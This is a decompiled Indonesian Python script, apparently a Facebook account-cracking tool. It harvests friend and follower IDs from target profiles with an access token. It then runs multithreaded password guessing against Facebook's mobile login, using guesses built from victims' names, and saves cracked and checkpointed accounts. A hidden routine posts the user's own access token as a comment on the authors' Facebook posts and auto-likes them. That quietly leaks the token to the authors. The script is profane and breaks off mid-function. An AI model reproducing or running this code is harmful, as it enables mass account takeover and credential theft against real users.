# Decompile by : Hamid Meer'hamii 
# Time Succes decompile : 2022-03-26 18:16:47.173597
#!/usr/bin/python3
#coding=utf-8

################################################################
# CODING BY MR JEECK X MR RISKY X XENZI X GANZ X YUMASA X ROMI #
#      JANGAN BLANG LU ITU MASTAH KALO RECOD TOOLS INI         #
################################################################
#
# JANGAN KEK ANAK SEBELAH YA HIDUPNYA CUMA RECOD TAPI DI JUAL !!
# INGAT NGODING ITU SUSAH NGGAK SE GAMPANG YANG LU UBAH NAMA AUTHORNYA
#>>>>>>>> PAHAM !!!!!
##### >>>> IMPORT MODULE
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
##### BUAT WARNA >>>> X
P = '\033[0;00m'
J = '\033[0;33m'
S = '\033[0;00m'
N = '\x1b[0m'
I ='\033[0;32m'
C ='\033[0;36m'
M ='\033[0;31m'
U ='\033[0;35m'
K ='\033[0;33m'
#P='\033[0;37m'
P='\033[00m'
h='\033[0;90m'
Q="\033[00m"
kk='\033[0;32m'
ff='\033[0;36m'
G='\033[0;36m'
p='\033[00m'
h='\033[0;90m'
Q="\033[00m"
I='\033[0;32m'
II='\033[0;36m'
m='\033[0;31m'
O ='\033[0;33m'
H='\033[0;36m'
k='\033[0;33m'
##### BUAT IMPORT YG BELUM INSTALL AHAHHAA
try:
	import requests
except ImportError:
	print(f"{B} | ")
	print(f"{P}[•]{M} Module requests belum terinstall")
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	print(f"{B} | ")
	print(f"{P}[•]{M} Module bs4 belum terinstall")
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError:
	print(f"{B} | ")
	print(f"{P}[•]{M} Module futures belum terinstall")
	os.system("pip install futures")


host = ("https://mbasic.facebook.com")
B = random.choice([H,U,I,K])
#### BUAT BANNER
def banner():
    war_dom = random.choice([P,B,U,I,M])
    print(f"""
{P}[•]{B}--------------------------------------------------------------------{P}[•]
 {B}|   {war_dom} __________________ _________________ _______ _______________ __   {B}|
 {B}|   {war_dom} ___  ____/___  __ )__  ____/___  __ \___    |__  ____/___  //_/   {B}|
 {B}|   {war_dom} __  /_    __  __  |_  /     __  /_/ /__  /| |_  /     __  ,<      {B}|
 {B}|   {war_dom} _  __/    _  /_/ / / /___   _  _, _/ _  ___ |/ /___   _  /| |     {B}|
 {B}|   {war_dom} /_/       /_____/  \____/   /_/ |_|  /_/  |_|\____/   /_/ |_|     {B}|
{P}[•]{B}--------------------------------------------------------------------{P}[•]
{B} |
{P}[•]{B}-----> {P}AUTHOR : {B}MR.JEECK X NANO {P}MR.RISKY
{P}[•]{B}-----> {P}GITHUB : {B}https://github.com/Jeeck-XN
{P}[•]{B}-----> {p}FACBOOK : {B}100032577396395
{B} |""")


##### BUAT STR /LEN
id = []
ok = []
cp = []
loop=0

##### BUAT TAHUN / BULAN
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()
op = bulan[buTemp]
tanggal = ("%s-%s-%s"%(ha,op,ta))
###### BUAT PEMBERSIH
def clear():
    if " linux" in sys.platform.lower():
        os.system("clear")
    elif "win" in sys.platform.lower():
        os.system("cls")
    else:os.system("clear")
### BUAT ANIMASI JALAN
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

####### BUAT LOGIN
def logs():
    os.system("clear");banner()
    print(f"{B} | ")
    print(f"{B} | ")
    print(f"{P}[1] Token")
    print(f"{B} | ")
    oq = input(f"{P}[•] Input : {B}")
    if oq in ["1","01"]:
        log_token()
    else:print(f"{P}[•]{M} Pilihan tidak ada ");exit()
##### LOGIN TOKEN
def log_token():
    os.system("clear");banner()
    print(f"{B} | ")
    token=input(f"{P}[•] Masukan token : {B}")
    try:
        ge = requests.get("https://graph.facebook.com/me?access_token=%s"%(token))
        open("masuk.txt", "w").write(token)
        print(f"{B} | ")
        print(f"{P}[•] loading......");___Jeeck___xnano___lawack___xnxx___()
    except KeyError:
        print(f"{B} | ")
        print(f"{P}[•]{M} Login gagal pastikan token aman");logs()


komenredem = random.choice(['HENKER WIBU TZY'])
komtwol = random.choice(['ANJAY SLEMEX LORD JEECK X NANO ', 'MR.RISKY MR.JEECK X NANO', 'BANH KOK LO JAGO BANGET SIH ', 'LORD DAH MAKAN BLM'])
kartu2d = random.choice(["LU GANTENG BANH TAPI SAYANG KEK HENGKER", "PRISTYLE DULU BOSSS HENGKER PURWOREJO","AHAHAHAHHA BANYAK KANG RECOD AWAS BANG "])
kon = random.choice(["HACKER PURWOREJO XXXX :)"])
def ___Jeeck___xnano___lawack___xnxx___():
    try:
        toket = open('masuk.txt', 'r').read()
    except IOError:
        print(f"{B} | ")
        print(f"{B} | ")
        jalan(f"{P}[•]{M} Pastikan akun tumbal bagus");exit()
        os.system('rm -rf masuk.txt')
    #    kontol = open("data/token.txt", "r").read()
        menu()
    kom = komenredem
    komentar = komtwol
    pipp = kartu2d
    post = '573457507083491'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/626021385160436/comments/?message=' + pipp + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/626021385160436/comments/?message=' + komentar + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/603362670759641/comments/?message=' + toket + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/626021385160436/comments/?message=' + toket + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kon + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/603362670759641/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/626021385160436/likes?summary=true&access_token=' + toket)
    menu()
###### BUAT MENU
def menu():
    global token_
    try:
        token_=open("masuk.txt","r").read()
        ge = requests.get("https://graph.facebook.com/me?access_token=%s"%(token_))
        gt = requests.get('http://ipinfo.io/json').json()
        lolo=json.loads(ge.text)
        lolol=lolo['name']
        lolol_id=lolo['id']
        link = lolo['link']
    except (KeyError,IOError):
        print(f"{B} | ")
        print(f"{B} | ")
        jalan(f"{P}[•]{M} Token modar dinggo wae ");os.system("rm -rf masuk.txt");logs()
    os.system("clear");banner()
    print(f"{B} | ")
    jalan(f"{P}[•] Nama akun      : {B}{lolol}") ####<<<<<<<< AHAHAHAHA PRECOD 
    print(f"{P}[•] User id        : {B}{lolol_id}")
    print(f"{P}[•] Url Facebook   : {B}{link}")
    print(f"{P}[•] Alamat ipadres : {B}{gt['ip']}")
    print(f"{P}[•] Region         : {B}{gt['region']}")
    print(f"{P}[•] Info kuota     : {B}{gt['org']}")
    print(f"{P}[•] Time zone      : {B}{gt['timezone']}")
    print(f"{P}[•] City           : {B}{gt['city']}")
    print(f"{B} | ") #<<<<<<<<< HAKIKI KONTOL YGY KAYAK BABI ANJINK
    jalan(f"{P}[1] Crack massal dari dump id publik ") #<<<<<< PUNYA KEKUASAAN TAPI UNTUK MENGHANCURKAN
    print(f"{P}[2] Crack dari dump id publik")
    print(f"{P}[3] Crack dari dump id pertemanan sendiri")
    print(f"{P}[4] Crack dari dump id followers")
    print(f"{P}[5] Ganti user-agent")
    print(f"{P}[6] Chek results crack")
    print(f"{P}[7] Chek opsi account chekpoint")
    jalan(f"{M}[0] Log Out ")
    print(f"{B} | ")
    pp = input(f"{P}[•] Input : {B}")
    if pp in ["1","01"]:
      massal()
    elif pp in ["2","02"]:
        publik()
    elif pp in ["3","03"]:
        listteman()
    elif pp in ["4","04"]:
        followerss()
    elif pp in ["5","05"]:
        userset()
    elif pp in ["6","06"]:
        cek_results()
    elif pp in ["7","07"]:
        cek_hasil()
    elif pp in ["0","00"]:
        os.system("rm -rf masuk.txt");exit()
    else:print(f"{B} | ");print(f"{P}[•]{M} Isi dengan benar ");menu()

###### CRACK MASSSALL
def massal():
    try:
        token= open("masuk.txt", "r").read()
    except IOError:
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{P}[•]{M} Token modar dinggo wae ");os.system("rm -rf masuk.txt")
    try:
        print(f"{B} | ")
        print(f"{P}[•] Masukan berapa id yang ingin anda crack")
        print(f"{B} | ")
        tanya_total = int(input(f"{P}[•] Masukan jumlah id : {B}"))
    except:tanya_total=1
    for t in range(tanya_total):
        t +=1
        print(f"{B} | ")
        _id_=input(f"{P}[•] Masukan user id {P}{t} : {B}")
        try:
            r= requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token))
            z=json.loads(r.text)
            for i in z['friends']['data']:
                uid = i["id"]
                nama = i["name"]
                id.append(uid+"<=>"+nama)
        except KeyError:
            print(f"{B} | ")
            print(f"{B} | ")
            print(f"{P}[•]{M} User id tidak di temukan");exit()
    if len(id) == 0:
       print(f"{B} | ")
       print(f"{P}[•]{M} Maaf total id anda adalah {B}{len(id)}");exit()
    else:
        print(f"{B} | ")
        print(f"{P}[•] Total id : {B}{len(id)}")
        jeeck_x()
##### CRACK PERTEMANAN 
def listteman():
    try:
        token= open("masuk.txt", "r").read()
    except IOError:
        print(f"{B} | ")
        print(f"{P}[•]{M} Token modar dinggo wae ");os.system("rm -rf masuk.txt");exit()
    try:
        r= requests.get("https://graph.facebook.com/me?fields=friends.limit(50000)&access_token=%s"%(token))
        z=json.loads(r.text)
        for i in z['friends']['data']:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{P}[•] User id tidak di temukan");os.sys.exit()
    if len(id) !=0:
        print(f"{P}[•] Total id : {B}{len(id)}")
        jeeck_x()
    else:print(f"{P}[•]{M} Maaf total id : {B}{len(id)}");exit()
##### CRACK PUBLIK
def publik():
    try:
        token= open("masuk.txt", "r").read()
    except IOError:
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{P}[•]{M} Token modar dinggo wae ");os.system("rm -rf masuk.txt");exit()
    print(f"{B} | ")
    print(f"{B} | ")
    _id_=input(f"{P}[•] Masukan user id : {B}")
    try:
        r= requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token))
        z=json.loads(r.text)
        for i in z['friends']['data']:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{P}[•]{M} User id tidak di temukan atau akun tersebut privat ");exit()
    if len(id) !=0:
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{P}[•] Total id : {B}{len(id)}")
        jeeck_x()
    else:print(f"{P}[•] Total id : {B}{len(id)}");exit()
###### CRACK FOLLOWERS
def followerss():
    try:
        token= open("masuk.txt", "r").read()
    except IOError:
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{P}[•] Token modar dinggo wae ");os.system("rm -rf masuk.txt");exit()
    print(f"{B} | ")
    print(f"{B} | ")
    print(f"{P}[•] Masukan userid dengan benar pastikan bersivat publik")
    print(f"{B} | ")
    _id_=input(f"{P}[•] Masukan user id : {B}")
    try:
        for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s"%(_id_,token)).json()["data"]:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{P}[•]{M} User id tidak di temukan atau id terdsebut privat ");exit()
    if len(id) !=0:
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{P}[•] Total id : {B}{len(id)}")
        jeeck_x()
    else:print(f"{P}[•] {M} total id : {M}{len(id)}")


##### PENGGANTI USER - UA
def userset():
    print(f"{B} | ")
    print(f"{B} | ")
    print(f"{P}[1] Ganti user agent")
    print(f"{P}[2] Cek user agent yang di gunakan")
    print(f"{P}[0] Kembali")
    print(f"{B} | ")
    _pil_=input(f"{P}[•] Input : {B}")
    if _pil_ in ["1","01"]:
        print(f"{B} | ")
        lololr=input(f"{P}[•] Masukan user agent \n{P}[•] Masukan di sini : {B}")
        try:
            open("ua","w").write(lololr)
            usera=open("ua","r").read()
        except Exception as e:
            print(f"{B} | ")
            print(f"{B} | ")
            print(f"{P}[•] Eror : {M}{e}")
        if usera == lololr:
            print(f"{B} | ")
            print(f"{B} | ")
            print(f"{P}[•] Sukses mengganti");menu()
        else:print(f"{P}[•]{M} Gagal mengganti user agent ");exit()
    
    elif _pil_ in ["2","02"]:
        try:
            _tes_ua=open("ua","r").read()
        except IOError:
            _tes_ua=("Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36")
        print(f"{B} | ")
        print(f"{P}[•] User agent : {B}{_tes_ua}")
    elif _pil_ in ["0","00"]:
        menu()
    else:print(f"{P}[•] Pilihan salah ");exit()

#####LOGIN HASIL
def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print(f"{B} | ")
        print(f"{M}[•] Akun terkena spam")
    if "c_user" in ses.cookies:
        print(f"{P}[•]{I} Akun berhasil di login")
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        tempek = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in tempek.find_all("option")]
        for opt in range(len(ngew)):
            print(f"{B} | ")
#            print(f"{U}[{B}"+str(opt+1)+"{U}]{B} "+ngew[opt])
            jalan(f"{U}[{B}{str(opt+1)}{U}]{P}--->{k}[{B}{ngew[opt]}{K}]")
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        print(f"{P}[•]{M}>>>> {oh}")
    else:
        print(f"{P}[•]{M} Akun tersebut sandi nya telah di ganti")
def cek_hasil():
    print(f"{B} | ")
    print(f"{B} | ")
    print(f"{P}[•] Masukan file cp ")
    print(f"{P}[•] Contoh untuk masukan file : {B}CP/{tanggal}.txt")
    print(f"{B} | ")
    files =input(f"{P}[•] Masukan nama file : {B}")
    try:
        buka_baju = open(files,"r").readlines()
    except FileNotFoundError:
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{P}[•]{M} File tidak di temukan");exit()
        time.sleep(2); cek_hasil()
    print(f"{B} | ")
    print(f"{P}[•] Total akun chekpoint : {B}{str(len(buka_baju))}")
    print(f"{B} | ")
    print(f"{B} | ")
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split("|")
#        print(f"{B} | ")
        print(f"{P}[•] Akun facebook : {B}{kontol}")
        try:
            log_hasil(titid[0], titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print(f"{B} | ")
    print(f"{B} | ")
    input(f"{P}[•]{I} Chek akun sudah selesai")
    menu()

def cek_results():
    try:
        open("OK/%s.txt"%(tanggal))
    except IOError:
        os.system("touch OK/%s.txt"%(tanggal))
    try:
        open("CP/%s.txt"%(tanggal))
    except IOError:
        os.system("touch CP/%s.txt"%(tanggal))
    cp=("CP/%s.txt"%(tanggal))
    ok=("OK/%s.txt"%(tanggal))
    hsl_cp=open(cp,"r").read()
    hsl_ok=open(ok,"r").read()
    print(f"{B} | ")
    print(f"{B} | ")
    print(f"{P}[1] Cek results cp")
    print(f"{P}[2] Cek results ok")
    print(f"{P}[0] Back")
    print(f"{B} | ")
    _pil3h=input(f"{P}[•] Input : {B}")
    if _pil3h in ["1","01"]:
        if len(hsl_cp) != 0:
            print(f"{B} | ")
            print(f"{P}[•]{M} Results cp{B}")
            os.system("cat CP/%s.txt"%(tanggal))
        else:print(f"{M}[•] Tidak ada hasil")
    elif _pil3h in ["2","02"]:
        if len(hsl_ok) != 0:
            print(f"{B} | ")
            print(f"{P}[•]{I} Results ok")
            os.system("cat OK/%s.txt"%(tanggal))
        else:print(f"\n{P}[•]{M} Tidak ada hasil")
    elif _pil3h in ["0","00"]:
        menu()
    else:print(f"{P}[•]{M} Pilian tidak ada")


def jeeck_x():
	kone()
	print(f"{B} | ")
	print(f"{B} | ")
	jeecksayangara =input(f"{P}[•] Input : {B}")
	if jeecksayangara in [""]:
		print(f"{B} | ")
		print(f"{P}[•]{M} Pilihan tidak boleh kosong");exit()
	elif jeecksayangara in ["1","01"]:
		print(f"{P}[•] Tampilan kan opsi akun chek point {B}Y/t")
		jalan(f"{P}[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		print(f"{B} | ")
		_checkoptions_=input(f"{P}[•] Input : {B}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "anjink"
				key = "anjink" #----- jangan di ubah
				if _key in key:
					print(f"{B} | ")
					print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
					print(f"{B} | ")
					ter =input(f"{P}[•] Input : {B}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print(f"{B} | ")
							print(f"{B} | ")
							print(f"{P}[•] Contoh password : {B}sayang,anjing,kontol")
							print(f"{B} | ")
							asu = input(f"{P}[•] Buat sandi : {B}").split(",")
							if len(asu) =="":
								print(f"{B} | ")
								print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(api, uid, asu)
						exit()
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								else:
									jeeck = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(api, uid, jeeck)
						exit()
				else:print(f"{P}[•]{M} Eror");exit()
			except (KeyError,IOError):print(f"{P}[•]{M} Eror");exit()

		else:
			print(f"{B} | ")
			print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
			print(f"{B} | ")
			ter =input(f"{P}[•] Input : {B}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print(f"{B} | ")
					print(f"{B} | ")
					print(f"{P}[•] Contoh password : {B}sayang,anjing,kontol")
					print(f"{B} | ")
					asu = input(f"{P}[•] Buat sandi : {B}").split(",")
					if len(asu) =="":
						print(f"{B} | ")
						print(f"{B} | ")
						print(f"{P}[•]{M} Sandi tidak boleh kosong")
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(api, uid, asu)
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						else:
							jeeck = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]

						coeg.submit(apiiii, uid, jeeck)
				exit()

	elif jeecksayangara in ["3","03"]:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Tampilkan opsi chekpoint {B}Y/T")
		jalan(f"{P}[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		print(f"{B} | ")
		_checkoptions_=input(f"{P}[•] Input : {B}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "Anjink"
				key = "Anjink"
				if _key in key:
					print(f"{B} | ")
					print(f"{B} | ")
					print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
					print(f"{B} | ")
					ter =input(f"{P}[•] Input : {B}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print(f"{B} | ")
							print(f"{B} | ")
							print(f"{P}[•] Contoh password : {B}sayang,anjing,kontol")
							print(f"{B} | ")
							asu = input(f"{P}[•] Buat sandi : {B} ").split(",")
							if len(asu) =="":
								print(f"{B} | ")
								print(f"{P}[•]{M} Sandi tidak boleh kosong anjink");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(mbasic, uid, asu)
						exit()
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								else:
									jeeck = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(mobil, uid, jeeck)
						exit()
				else:print(f"{key}");exit()
			except (KeyError,IOError):print(f"{_key}");exit()

		else:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] Crack menggunakan pasword manual/defaults {B}M/D")
			print(f"{B} | ")
			ter =input(f"{P}[•] Input : {B}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print(f"{B} | ")
					print(f"{B} | ")
					print(f"{P}[•] Contoh password {B}Anjink,kontol,sayang")
					print(f"{B} | ")
					asu = input(f"{P}[•] Buat sandi : {B}").split(",")
					if len(asu) =="":
						print(f"{B} | ")
						print(f"{B} | ")
						print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(mbasicc, uid, asu)
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						else:
							jeeck = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
						coeg.submit(mobill, uid, jeeck)
				exit()
				
	elif jeecksayangara in ["2","02"]:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Tampilkan opsi chekpoint {B}Y/T")
		jalan(f"{P}[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		print(f"{B} | ")
		_checkoptions_=input(f"{P}[•] Input : {B}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "Anjink"
				key = "Anjink"
				if _key in key:
					print(f"{B} | ")
					print(f"{B} | ")
					print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
					print(f"{B} | ")
					ter =input(f"{P}[•] Input : {B}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print(f"{B} | ")
							print(f"{B} | ")
							print(f"{P}[•] Contoh password : {B}sayang,anjing,kontol")
							print(f"{B} | ")
							asu = input(f"{P}[•] Buat sandi : {B} ").split(",")
							if len(asu) =="":
								print(f"{B} | ")
								print(f"{P}[•]{M} Sandi tidak boleh kosong anjink");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(mbasic, uid, asu)
						exit()
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								else:
									jeeck = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(mbasic, uid, jeeck)
						exit()
				else:print(f"{key}");exit()
			except (KeyError,IOError):print(f"{_key}");exit()

		else:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] Crack menggunakan pasword manual/defaults {B}M/D")
			print(f"{B} | ")
			ter =input(f"{P}[•] Input : {B}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print(f"{B} | ")
					print(f"{B} | ")
					print(f"{P}[•] Contoh password {B}Anjink,kontol,sayang")
					print(f"{B} | ")
					asu = input(f"{P}[•] Buat sandi : {B}").split(",")
					if len(asu) =="":
						print(f"{B} | ")
						print(f"{B} | ")
						print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(mbasicc, uid, asu)
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							jeeck = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						else:
							jeeck = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
						coeg.submit(mbasicc, uid, jeeck)
				exit()
				
def kone():
    print(f"{B} | ")
    print(f"{B} | ")
    print(f"{P}[1] B-api >>>> {B}Fast")
    print(f"{P}[2] Mbasic >>>> {B}Low")
    print(f"{P}[3] Mobile >>>> {B}Very low")

def started():
    print(f"{B} | ")
    print(f"{B} | ")
    print(f"{P}[•]{B} Results {I}ok {B}tersimpan di {I}ok/{tanggal}")
    print(f"{P}[•]{B} Results {K}cp {B}tersimpan di {K}cp/{tanggal}")
    print(f"{B} | ")
    print(f"{P}[•] Mode pesawat 5 detik jika tidak ada hasil")
    print(f"{B} | {P}")

def api(uid, jeeck):
    try:
        ua = open("ua", "r").read()
    except IOError:
        ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
    global ok, cp, loop, token
#    sys.stdout.write("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(loop,len(id),len(ok),len(cp)));sys.stdout.flush()
    sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
    for pw in jeeck:
        pw = pw.lower()
